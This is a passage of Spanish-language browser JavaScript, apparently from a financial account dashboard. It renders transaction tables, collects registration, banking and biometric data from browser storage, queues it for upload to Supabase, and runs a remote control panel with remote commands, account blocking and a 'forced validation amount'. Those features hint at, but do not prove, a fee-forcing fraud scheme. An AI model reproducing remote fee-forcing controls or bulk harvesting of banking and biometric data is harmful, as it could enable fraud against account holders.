        dateCell.textContent = formatTimestamp(entry.timestamp);
        row.appendChild(dateCell);

        const typeCell = document.createElement('td');
        typeCell.textContent = entry.label;
        row.appendChild(typeCell);

        const detailCell = document.createElement('td');
        const details = [];
        if (entry.sessionId) {
          details.push(`Sesión ${entry.sessionId}`);
        }
        if (entry.reason) {
          details.push(entry.reason);
        }
        if (entry.raw && entry.raw.source) {
          details.push(entry.raw.source);
        }
        if (entry.raw && entry.raw.context) {
          details.push(entry.raw.context);
        }
        detailCell.textContent = details.length ? details.join(' · ') : '—';
        row.appendChild(detailCell);

        historyBody.appendChild(row);
      });

    historyWrapper.hidden = false;
    emptyState.hidden = true;
  }

  function renderTransactions(transactions) {
    const body = document.getElementById('transactions-body');
    const empty = document.getElementById('transactions-empty');
    const badge = document.getElementById('transactions-updated');
    if (!body || !empty || !badge) return;

    body.innerHTML = '';

    if (!Array.isArray(transactions) || transactions.length === 0) {
      empty.hidden = false;
      badge.textContent = 'Sin datos';
      return;
    }

    empty.hidden = true;
    badge.textContent = `Mostrando ${Math.min(transactions.length, 25)} registros`;

    const sorted = transactions
      .slice(0)
      .sort((a, b) => (resolveTimestamp(b) || 0) - (resolveTimestamp(a) || 0))
      .slice(0, 25);

    sorted.forEach((transaction) => {
      const row = document.createElement('tr');

      const dateCell = document.createElement('td');
      dateCell.textContent = formatTimestamp(resolveTimestamp(transaction));

      const descriptionCell = document.createElement('td');
      const description = transaction?.description || transaction?.title || transaction?.concept || transaction?.notes || 'Sin descripción';
      descriptionCell.textContent = description;

      const typeCell = document.createElement('td');
      const type = transaction?.type || transaction?.category || transaction?.movementType || '—';
      typeCell.textContent = type;

      const amountCell = document.createElement('td');
      const amountInfo = resolveAmount(transaction);
      amountCell.textContent = formatCurrency(amountInfo.amount, amountInfo.currency);

      const statusCell = document.createElement('td');
      const statusInfo = resolveStatus(transaction);
      const statusSpan = document.createElement('span');
      statusSpan.className = ['status-pill', statusInfo.css].filter(Boolean).join(' ');
      statusSpan.textContent = statusInfo.label;
      statusCell.appendChild(statusSpan);

      row.appendChild(dateCell);
      row.appendChild(descriptionCell);
      row.appendChild(typeCell);
      row.appendChild(amountCell);
      row.appendChild(statusCell);

      body.appendChild(row);
    });
  }

  function refreshAll() {
    const registration = loadRegistration();
    const registrationTemp = loadRegistrationTemp();
    const userData = loadUserData();
    const verification = loadVerificationData();
    const banking = loadVerificationBanking();
    const biometric = loadVerificationBiometric();
    const biometricSkipped = loadVerificationBiometricSkip();
    const rate = getRateInfo();
    const balance = loadBalance();
    const transactions = loadTransactions();
    const sessionMonitor = loadSessionMonitor();
    const balanceHistoryRecords = loadBalanceHistoryRecords();

    const combinedRegistration = Object.assign(
      {},
      registrationTemp && typeof registrationTemp === 'object' ? registrationTemp : {},
      userData && typeof userData === 'object' ? userData : {},
      verification && typeof verification === 'object' ? verification : {},
      banking && typeof banking === 'object' ? banking : {},
      registration && typeof registration === 'object' ? registration : {}
    );

    const profile = gatherProfileInfo(
      registration,
      userData,
      verification,
      banking,
      registrationTemp,
      biometric,
      biometricSkipped
    );
    const snapshots = collectRegistrationSnapshots();
    const exchangeRates = resolveExchangeRates(rate, profile.sessionRate);
    const accountInfo = resolveAccountInfo(balance, exchangeRates);
    const history = buildBalanceHistory(balanceHistoryRecords, balance, transactions, exchangeRates);
    const remoteState = {
      commands: loadRemoteCommands(),
      processed: loadProcessedCommandIds(),
      blockState: loadRemoteBlockState(),
      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd')),
      discount:
        safeJSONParse(safeGetFromStorage(localStorage, 'validationDiscount')) ||
        safeJSONParse(safeGetFromStorage(sessionStorage, 'validationDiscount')) ||
        null,
      pendingCommission: toNumber(localStorage.getItem('pendingCommission')),
      discountExpiry:
        safeGetFromStorage(localStorage, 'discountExpiry') ||
        safeGetFromStorage(sessionStorage, 'discountExpiry') ||
        null,
      discountUsed:
        safeGetFromStorage(localStorage, 'discountUsed') === 'true' ||
        safeGetFromStorage(sessionStorage, 'discountUsed') === 'true'
    };

    const snapshotForSupabase = buildSupabaseSnapshot({
      profile,
      registration: combinedRegistration,
      registrationSnapshots: snapshots,
      rate,
      balance,
      accountInfo,
      history,
      sessionMonitor,
      transactions,
      remote: remoteState,
      biometric,
      biometricSkipped,
      sources: {
        registration,
        registrationTemp,
        userData,
        verification,
        banking,
        biometric,
        balanceHistoryRecords,
        sessionMonitor,
        rate,
        balance,
        transactions
      },
      exchangeRates
    });

    lastSnapshotPayload = snapshotForSupabase;
    lastKnownProfile = profile;
    queueSupabaseSnapshot(snapshotForSupabase);

    renderProfile(profile);
    renderRegistration(combinedRegistration, Boolean(registration));
    renderRegistrationSnapshots(snapshots);
    renderRate(rate);
    renderBalance(balance);
    renderAccountLevel(accountInfo);
    renderBalanceHistory(history);
    renderSessionMonitor(sessionMonitor);
    renderTransactions(transactions);
    renderBiometricVerification(biometric, biometricSkipped);
    renderRemoteControlPanel({
      balance,
      rate,
      commands: remoteState.commands,
      processed: remoteState.processed,
      blockState: remoteState.blockState,
      validationAmount: remoteState.validationAmount
    });
  }

  let refreshTimeout = null;

  function scheduleRefresh(delay = 0) {
    if (refreshTimeout) {
      clearTimeout(refreshTimeout);
    }
    refreshTimeout = setTimeout(refreshAll, delay);
  }

  document.addEventListener('DOMContentLoaded', function () {
    initSupabaseStatusUi();
    initRemoteControls();
    refreshAll();
    setInterval(refreshAll, 60000);
  });

  window.addEventListener('storage', function () {
    scheduleRefresh();
  });

  const watchedKeys = new Set(
    ACCOUNT_STORAGE_KEYS.concat([
      REMOTE_COMMAND_KEY,
      REMOTE_PROCESSED_KEY,
      REMOTE_BLOCK_STATE_KEY
    ])
  );

  const originalSetItem = localStorage.setItem.bind(localStorage);
  localStorage.setItem = function (key, value) {
    originalSetItem(key, value);
    if (watchedKeys.has(key)) {
      scheduleRefresh(10);
    }
  };

  const originalRemoveItem = localStorage.removeItem.bind(localStorage);
  localStorage.removeItem = function (key) {
    originalRemoveItem(key);
    if (watchedKeys.has(key)) {
      scheduleRefresh(10);
    }
  };

  if (typeof sessionStorage !== 'undefined') {
    const originalSessionSetItem = sessionStorage.setItem ? sessionStorage.setItem.bind(sessionStorage) : null;
    if (originalSessionSetItem) {
      sessionStorage.setItem = function (key, value) {
        originalSessionSetItem(key, value);
        if (watchedKeys.has(key)) {
          scheduleRefresh(10);
        }
      };
    }

    const originalSessionRemoveItem = sessionStorage.removeItem ? sessionStorage.removeItem.bind(sessionStorage) : null;
    if (originalSessionRemoveItem) {
      sessionStorage.removeItem = function (key) {
        originalSessionRemoveItem(key);
        if (watchedKeys.has(key)) {
          scheduleRefresh(10);
        }
      };
    }
  }
})();
